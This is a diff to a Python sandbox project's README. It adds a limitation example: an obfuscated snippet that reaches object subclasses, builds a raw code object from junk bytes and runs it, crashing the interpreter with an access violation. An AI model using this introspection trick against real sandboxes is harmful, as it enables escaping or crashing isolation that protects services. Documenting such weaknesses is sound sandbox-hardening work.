@@ -31,6 +31,14 @@ Python offers limited sandbox possibilities, with most solutions out there hard 
 -> main process quit: 
 -> Process finished with exit code -1073741819 (0xC0000005)
 ```
+same code written differently:
+```py
+x = (lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0])
+y = x("function")(x("code")(0,0,0,0,0,0,b'wasd',(),(),(),"","",0,b"wasddeath"),{})
+y()
+-> main process quit: 
+-> Process finished with exit code -1073741819 (0xC0000005)
+```
 ## planned/todo
 - safe extraction of variables/functions
 - will add more later as my time is now limited
